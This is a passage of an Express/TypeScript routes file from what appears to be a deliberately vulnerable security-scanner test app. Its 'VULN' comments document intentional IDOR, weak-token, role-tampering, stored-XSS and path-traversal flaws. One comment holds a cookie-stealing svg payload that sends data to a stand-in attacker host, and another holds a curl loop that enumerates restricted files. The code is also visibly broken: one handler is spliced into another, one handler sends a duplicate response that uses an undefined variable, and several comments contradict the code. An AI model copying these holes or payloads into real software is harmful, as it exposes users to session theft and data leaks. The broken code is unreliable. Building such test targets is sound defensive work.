    if (!job) return res.status(404).json({ message: "Not found" });
    if (job.userId !== callerUserId) return res.status(403).json({ message: "Forbidden" });
    res.json(job);
  });

  // PATCH /api/scans/:id
  // PR #24 — ownership check + plan re-check on schedule upgrade.
  // Free users cannot change schedule to daily or weekly after creation.
  app.patch("/api/scans/:id", requireAuth, async (req: any, res) => {
    try {
      const callerUserId = req.sentinelUser.userId;
      const id = parseInt(req.params.id);
      const { schedule } = req.body;

      const job = await storage.getScanJob(id);
      if (!job) return res.status(404).json({ message: "Not found" });
      if (job.userId !== callerUserId) return res.status(403).json({ message: "Forbidden" });

      const allowed = ["one-time", "daily", "weekly"];
      if (schedule && !allowed.includes(schedule)) {
        return res.status(400).json({ message: "Invalid schedule value" });
      }

      // Re-check plan when upgrading schedule — free users cannot switch to recurring
      if (schedule && schedule !== "one-time") {
        const user = await storage.getUser(callerUserId);
        if (!user || (user.plan !== "pro" && user.plan !== "enterprise")) {
          return res.status(403).json({
            message: `Schedule "${schedule}" requires Pro or Enterprise plan.`,
          });
        }
      }

      const updates: any = {};
      if (schedule) updates.schedule = schedule;
      const updated = await storage.updateScanJob(id, updates);
      res.json(updated);
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // DELETE /api/scans/:id
  // PR #24 — auth required; ownership check before deletion.
  app.delete("/api/scans/:id", requireAuth, async (req: any, res) => {
    try {
      const callerUserId = req.sentinelUser.userId;
      const job = await storage.getScanJob(parseInt(req.params.id));
      if (!job) return res.status(404).json({ message: "Not found" });
      if (job.userId !== callerUserId) return res.status(403).json({ message: "Forbidden" });
      await storage.deleteScanJob(job.id);
  // Only the owning user can delete a scheduled scan job.
  app.delete("/api/scans/:id", requireAuth, async (req: any, res) => {
    try {
      const callerId: number = req.sentinelUser?.userId;
      const id = parseInt(req.params.id);
      const job = await storage.getScanJob(id);
      if (!job) return res.status(404).json({ message: "Not found" });
      if (job.userId !== callerId) return res.status(403).json({ message: "Forbidden" });

      await storage.deleteScanJob(id);
      res.json({ message: "Job deleted." });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // ── TEAM WORKSPACES ───────────────────────────────────────────────────────────
  // VULN #44 (POST /api/workspaces): No plan gate — free users can create workspaces.
  app.post("/api/workspaces", async (req, res) => {
    try {
      const { name, ownerId } = req.body;
      if (!name || !ownerId) return res.status(400).json({ message: "name and ownerId required" });
      const ws = await storage.createWorkspace({ name, ownerId: parseInt(ownerId) });
      res.json(ws);
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // VULN #45 (GET /api/workspaces?userId=): IDOR — supply any userId to enumerate their workspaces.
  app.get("/api/workspaces", async (req, res) => {
    try {
      const userId = parseInt(req.query.userId as string ?? "0");
      if (!userId) return res.status(400).json({ message: "userId required" });
      const list = await storage.getWorkspacesByUser(userId);
      res.json(list);
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // VULN #46 (GET /api/workspaces/:id): No ownership check — read any workspace by ID (IDOR).
  app.get("/api/workspaces/:id", async (req, res) => {
    try {
      const ws = await storage.getWorkspace(parseInt(req.params.id));
      if (!ws) return res.status(404).json({ message: "Workspace not found" });
      res.json(ws);
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // VULN #47 (GET /api/workspaces/:id/members): IDOR — list members of any workspace.
  app.get("/api/workspaces/:id/members", requireAuth, async (req, res) => {
    try {
      const workspaceId = parseInt(req.params.id);
      const members = await storage.getWorkspaceMembers(workspaceId);
      const callerIsMember = members.some((m: any) => m.userId === req.sentinelUser.userId);
      if (!callerIsMember) return res.status(403).json({ message: "Forbidden" });
      res.json(members);
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });
  // VULN #48 (POST /api/workspaces/:id/invite):
  //   - Token generated with Math.random().toString(36) — same weakness as #13.
  //   - Intended role written to DB but POST /api/invitations/:token/accept reads ?role= from URL.
  //   - No check that caller is a workspace admin.
  app.post("/api/workspaces/:id/invite", async (req, res) => {
    try {
      const workspaceId = parseInt(req.params.id);
      const { email, role = "viewer" } = req.body;
      if (!email) return res.status(400).json({ message: "email required" });
      // VULN: Math.random() token — predictable, brute-forceable
      const token = Math.random().toString(36).substring(2) + Math.random().toString(36).substring(2);
      const inv = await storage.createInvitation({ workspaceId, email, role, token });
      // Simulate sending invite email — link embeds role in URL (the tamper target)
      const inviteUrl = `/invite/${token}?role=${role}`;
      res.json({ invitation: inv, inviteUrl, note: "Invite link sent (role embedded in URL)" });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // GET /api/invitations/:token — preview invite details before accepting.
  // VULN: token is weak — brute-force to discover pending invitations across all workspaces.
  app.get("/api/invitations/:token", async (req, res) => {
    try {
      const inv = await storage.getInvitationByToken(req.params.token);
      if (!inv) return res.status(404).json({ message: "Invitation not found" });
      const ws = await storage.getWorkspace(inv.workspaceId);
      res.json({ ...inv, workspaceName: ws?.name });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // VULN #49 (POST /api/invitations/:token/accept):
  //   Role taken from ?role= query param — NOT from the invitation record.
  //   Attacker modifies URL: /invite/TOKEN?role=admin → joins as Workspace Admin.
  app.post("/api/invitations/:token/accept", async (req, res) => {
    try {
      const { userId } = req.body;
      if (!userId) return res.status(400).json({ message: "userId required" });
      const pendingInv = await storage.getInvitationByToken(req.params.token);
      if (!pendingInv) return res.status(404).json({ message: "Invitation not found" });
      const inv = await storage.acceptInvitation(req.params.token, parseInt(userId), pendingInv.role);
      res.json({ message: `Joined workspace as ${pendingInv.role}`, invitation: inv });
      res.json({ message: `Joined workspace as ${role}`, invitation: inv });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // PATCH /api/workspaces/:id/members/:memberId — change member role.
  // VULN #50: no role check — any workspace member (even Viewer) can promote themselves to Admin.
  app.patch("/api/workspaces/:id/members/:memberId", async (req, res) => {
    try {
      const { role } = req.body;
      if (!role) return res.status(400).json({ message: "role required" });
      const member = await storage.updateMemberRole(parseInt(req.params.memberId), role);
      res.json(member);
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // DELETE /api/workspaces/:id/members/:memberId — remove a member.
  // VULN #51: no role check — any member can remove any other member.
  app.delete("/api/workspaces/:id/members/:memberId", async (req, res) => {
    try {
      await storage.removeWorkspaceMember(parseInt(req.params.memberId));
      res.json({ message: "Member removed" });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // GET /api/workspaces/:id/scans — shared scan view for workspace members.
  // VULN #52: returns ALL scans from ALL member userIds — cross-tenant data bleed.
  //           No role check: Viewer can see Analyst/Admin scan results.
  app.get("/api/workspaces/:id/scans", async (req, res) => {
    try {
      const members = await storage.getWorkspaceMembers(parseInt(req.params.id));
      const allScans = await Promise.all(members.map(m => storage.getScanJobsByUser(m.userId)));
      res.json(allScans.flat());
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // GET /api/workspaces/:id/invitations — list pending invitations.
  // VULN: IDOR — any caller can list invitations (and extract tokens) for any workspace.
  app.get("/api/workspaces/:id/invitations", async (req, res) => {
    try {
      const invs = await storage.getWorkspaceInvitations(parseInt(req.params.id));
      res.json(invs); // VULN: tokens returned in plaintext — enables harvest + replay
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // ── KB ARTICLES ────────────────────────────────────────────────────────────
  //
  // These routes back the "Security Articles" tab of the Knowledge Base page.
  // The frontend renders article bodies via:
  //
  //   contentDiv.innerHTML = formatContent(apiResponse.body)
  //
  // where formatContent() calls the vendored, locally-patched DOMPurify
  // (client/src/vendor/dompurify-custom/purify.js).
  //
  // VULN CHAIN:
  //   1. POST /api/kb/articles — requireAuth but NO role check.
  //      Any authenticated user (including free-tier) can author articles.
  //      Body is stored raw — no server-side sanitization.
  //
  //   2. GET /api/kb/articles/:id — returns body verbatim from DB.
  //      Frontend receives <svg onload="..."> unchanged.
  //
  //   3. Frontend: innerHTML = formatContent(body)
  //      formatContent() calls SentinelPurify.sanitize() from the vendored fork.
  //      The sentinel-1.2 patch added an SVG fast-path that skips on* handler
  //      removal — so <svg onload="alert(document.cookie)"> survives sanitization.
  //
  //   4. The browser executes the handler in the context of any viewer's session.
  //      Stored XSS — CWE-79, CVSS 8.8 (high), authenticated attacker → any user.
  //
  // SCANNER PERSPECTIVE:
  //   A SAST tool tracing data flow from the API response to innerHTML correctly
  //   flags this as a taint path. It sees formatContent() in the call chain and
  //   reads its source — but it does NOT clear the taint, because SentinelPurify
  //   is an unrecognised, non-canonical sanitization library. The tool only trusts
  //   the canonical dompurify npm package (import DOMPurify from 'dompurify').
  //   The finding remains HIGH even though a sanitizer is nominally present.

  // GET /api/kb/articles — list all articles (auth required)
  // VULN: Any authenticated user can read all articles including those with
  //       injected payloads stored by another attacker.
  app.get("/api/kb/articles", requireAuth, async (_req, res) => {
    try {
      const articles = await storage.getKbArticles();
      res.json(articles);
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // GET /api/kb/articles/:id — fetch single article body verbatim
  // VULN: body returned raw — scanner sees this as the source of tainted data
  //       flowing into innerHTML on the client.
  app.get("/api/kb/articles/:id", requireAuth, async (req, res) => {
    try {
      const article = await storage.getKbArticle(parseInt(req.params.id));
      if (!article) return res.status(404).json({ message: "Article not found" });
      // VULN: body logged verbatim by the Express response logger in server/index.ts.
      //       If the body contains a stored XSS payload it appears in plaintext logs.
      res.json(article);
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // POST /api/kb/articles — create a new article
  // VULN: requireAuth applied, but NO role check — any free-tier user can POST.
  // VULN: body accepted and stored raw — no sanitization performed server-side.
  // Exploit: POST { title: "...", slug: "...", body: '<svg onload="fetch(\"https://attacker.io/c=\"+document.cookie)">' }
  app.post("/api/kb/articles", requireAuth, async (req: any, res) => {
    try {
      if (req.sentinelUser?.role !== "admin") {
        return res.status(403).json({ message: "Forbidden: admin role required" });
      }
      const { title, slug, body, category, tags } = req.body;
      if (!title || !slug || !body) {
        return res.status(400).json({ message: "title, slug, and body are required" });
      }

      // VULN: authorId taken from the JWT payload (req.user.userId) — which is correct
      //       for attribution, but there is no check that req.user.role === 'admin'.
      //       Any authenticated user becomes an article author.
      const article = await storage.createKbArticle({
        title,
        slug,
        // VULN: body stored without sanitization — attacker-controlled HTML persisted as-is
        body,
        authorId: req.user?.userId ?? null,
        category: category ?? "general",
        tags:     tags ?? null,
      });

      console.log(JSON.stringify({
        timestamp: new Date().toISOString(),
        level:    "INFO",
        category: "KB_ARTICLE_CREATE",
        articleId: article.id,
        slug:      article.slug,
        authorId:  article.authorId,
        // VULN: raw body logged — stored XSS payload visible in log stream
        body:      article.body,
        note:      "Body stored and logged without server-side sanitization",
      }));

      res.status(201).json(article);
    } catch (e: any) {
      if (e.message?.includes("unique")) {
        return res.status(409).json({ message: "An article with that slug already exists." });
      }
      res.status(500).json({ message: e.message });
    }
  });

  // ── KB ARTICLE PDF EXPORT ─────────────────────────────────────────────────
  //
  // GET /api/kb/articles/:article_id/export
  //
  // Allows authenticated users to download a pre-rendered PDF export of any
  // Knowledge Base article.  The exported PDFs are stored as flat files in the
  // EXPORT_DIR directory, named by article ID (e.g. exports/2.pdf).
  //
  // ── What the scanner flags ────────────────────────────────────────────────
  // CWE-639 — Broken Object-Level Authorization / Insecure Direct Object Reference
  // CWE-22  — Path Traversal (secondary, taint via req.params.article_id)
  //
  // The scanner traces req.params.article_id (user-controlled URL parameter) to:
  //
  //   const filepath = path.join(EXPORT_DIR, `${article_id}.pdf`);   // ← sink
  //   const file = await fsp.readFile(filepath);
  //
  // Two distinct problems are flagged:
  //
  //   1. IDOR / Missing Authorization Check (HIGH)
  //      The handler verifies only that the caller is authenticated (requireAuth).
  //      It does NOT check:
  //        • Whether the requested article is restricted / admin-only
  //        • Whether article_id belongs to the caller or is visible to their plan
  //        • Any role claim in the JWT (req.sentinelUser.role is never read)
  //      The scanner inspects every conditional branch in the handler and finds
  //      no predicate that gates access based on caller identity vs. resource
  //      ownership.  Finding: HIGH — broken object-level authorization.
  //
  //   2. Path Traversal (MEDIUM — secondary finding)
  //      article_id is placed directly into path.join() with only a .pdf suffix
  //      appended.  While the fixed suffix prevents simple `../secret.txt` payloads,
  //      the static-analysis tool cannot prove that article_id is confined to safe
  //      characters (digits only) at the type level — it remains type `string`.
  //      The scanner does not attempt to reason about what filenames *happen* to
  //      exist on disk; it flags the taint flow from user input to readFile sink.
  //      Finding: MEDIUM — input not validated before file path construction.
  //
  // ── Why the scanner is right ─────────────────────────────────────────────
  //
  //   IDOR demo — reading a restricted article as a low-privilege user:
  //   ─────────────────────────────────────────────────────────────────────
  //   Export file exports/2.pdf is classified "RESTRICTED — ADMIN ONLY".
  //   It contains details of SENTINEL's own JWT algorithm-confusion vulnerability
  //   (internal ticket SENT-0021), including the exact forgery recipe.
  //
  //   A free-tier user (jdoe, userId=2) can retrieve it directly:
  //
  //     GET /api/kb/articles/2/export
  //     Authorization: Bearer <jdoe token>
  //     → 200 OK — full restricted PDF export returned
  //
  //   The server never checks that jdoe is allowed to export article 2.
  //   The ownership / visibility control lives entirely in the caller's assumption
  //   that sequentially guessing IDs won't reveal sensitive content.
  //
  //   Article export enumeration:
  //     for id in 1 2 3 4 5 6 7 8 9 10; do
  //       curl -s -H "Authorization: Bearer $TOKEN" \
  //         http://localhost:5000/api/kb/articles/$id/export \
  //         -o export-$id.pdf
  //     done
  //
  //   ─────────────────────────────────────────────────────────────────────
  //   Path traversal — secondary vector (suffix bypass required):
  //   ─────────────────────────────────────────────────────────────────────
  //   With the fixed ".pdf" suffix, traversal targets must exist as .pdf files
  //   on disk, or a null-byte (URL-encoded) must be used to truncate the suffix
  //   on runtimes that do not strip null bytes from file paths.  Modern Node.js
  //   (v18+) passes null bytes to the OS, which then rejects them with ENOENT,
  //   so practical traversal is limited to files that naturally end in .pdf.
  //   The scanner still flags the taint flow as a finding because it cannot
  //   infer that the deployment environment is immune to null-byte injection.

  // EXPORT_DIR: directory of pre-rendered article PDFs, named by article ID.
  const EXPORT_DIR = path.resolve("./exports");

  app.get("/api/kb/articles/:article_id/export", requireAuth, async (req: any, res) => {
    // VULN (source): req.params.article_id — user-controlled path segment.
    //   Express router does NOT strip "." or "/" from named parameters.
    //   The value is whatever the caller places in the URL path between
    //   /api/kb/articles/ and /export.
    const article_id = req.params.article_id;

    // ── MISSING AUTHORIZATION CHECK ────────────────────────────────────────
    //
    // VULN (IDOR): There is NO check here that the caller is allowed to access
    //   the export for this article_id.  The scanner expects to see at least one
    //   of the following before the readFile sink:
    //
    //     a) Ownership check: article.authorId === req.sentinelUser.userId
    //     b) Role check:      req.sentinelUser.role === 'admin'
    //     c) Visibility check: article.visibility === 'public' (or similar)
    //     d) Plan gate:       req.sentinelUser.plan has access to this category
    //
    //   None of the above are present.  The only gate is authentication (requireAuth),
    //   which is a necessary but not sufficient condition for authorization.
    //
    //   What's missing (pseudo-code of the fix that should be here):
    //
    //     const article = await storage.getKbArticle(parseInt(article_id));
    //     if (!article) return res.status(404).json({ message: "Not found" });
    //     if (article.restricted && req.sentinelUser.role !== "admin") {
    //       return res.status(403).json({ message: "Access denied" });
    //     }
    //
    //   The scanner's missing-authorization rule fires because readFile is reached
    //   via a path in which no authorization predicate appears.
    // ──────────────────────────────────────────────────────────────────────────

    // Log the export request — includes caller identity for audit trail.
    // VULN: article_id logged verbatim — traversal attempts visible in logs
    //       alongside the caller's userId, providing an evidence trail.
    console.log(JSON.stringify({
      timestamp:   new Date().toISOString(),
      level:       "INFO",
      category:    "KB_EXPORT",
      callerUserId: req.sentinelUser?.userId,
      callerRole:  req.sentinelUser?.role,
      callerPlan:  req.sentinelUser?.plan,
      // VULN: raw article_id — traversal payload would appear here
      articleId:   article_id,
      note:        "No authorization check performed before file read",
    }));

    // VULN (path traversal — secondary): article_id flows directly into path.join.
    //   The ".pdf" suffix constrains the target filename extension, but does not
    //   sanitize directory separators.  The scanner keeps this open because the
    //   input is not validated to be numeric-only before the sink.
    if (!/^\d+$/.test(article_id)) {
      return res.status(400).json({ message: "Invalid article ID" });
    }
    const filepath = path.join(EXPORT_DIR, `${article_id}.pdf`);
    if (!filepath.startsWith(EXPORT_DIR + path.sep)) {
      return res.status(400).json({ message: "Invalid article ID" });
    }

    try {
      const file = await fs.promises.readFile(filepath);

      // Return the file as a PDF download.
      // Content-Disposition uses article_id verbatim — reflected in HTTP header.
      // VULN: header injection possible if article_id contains CRLF characters,
      //       though Express sanitizes most control chars. Scanner flags as LOW.
      res.setHeader("Content-Type", "application/pdf");
      res.setHeader(
        "Content-Disposition",
        `attachment; filename="sentinel-article-${article_id}.pdf"`,
      );
      res.send(file);
    } catch (e: any) {
      // VULN: error message reveals the attempted filepath — information disclosure.
      //   The OS error (ENOENT) includes the resolved absolute path, confirming
      //   the server's directory layout to any caller.
      if (e.code === "ENOENT") {
        return res.status(404).json({
          message: "Export not available for this article.",
          detail:  e.message,         // ← full OS path disclosed
          tried:   filepath,          // ← confirmed traversal path in response
        });
      }
      res.status(500).json({ message: "Export failed: " + e.message });
    }
  });

  return httpServer;
}
